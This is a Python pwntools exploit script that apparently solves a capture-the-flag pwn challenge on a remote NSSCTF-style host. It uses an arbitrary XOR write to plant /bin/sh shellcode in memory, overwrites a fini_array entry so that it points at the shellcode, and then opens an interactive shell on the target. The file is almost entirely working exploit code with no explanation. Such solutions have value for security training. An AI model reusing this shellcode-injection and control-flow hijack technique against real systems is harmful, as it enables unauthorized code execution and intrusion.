from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
#p = process('./pwn')
p = remote('node4.anna.nssctf.cn', 28555)
elf = ELF('./pwn')
#libc = ELF('/home/xsh/Desktop/libc.so.6')

def xor_(a, b):
	sla(b'addr: ', str(hex(a)))
	sla(b'value: ', str(hex(b)))
	
sc = asm(shellcraft.sh())
buf = 0x600c00

# set flag < 0
xor_(0x600bcc + 3, -1)

# set shellcode -> buf
for i in range(len(sc)):
	xor_(buf + i, sc[i])
	
# set buf -> fini_array
xor_(0x600970, 0 ^ 0x10)
xor_(0x600971, 0xc ^ 0x6)
xor_(0x600972, 0x60 ^ 0x40)

# set flag > 0
xor_(0x600bcc + 3, 0xff ^ 0)

inter()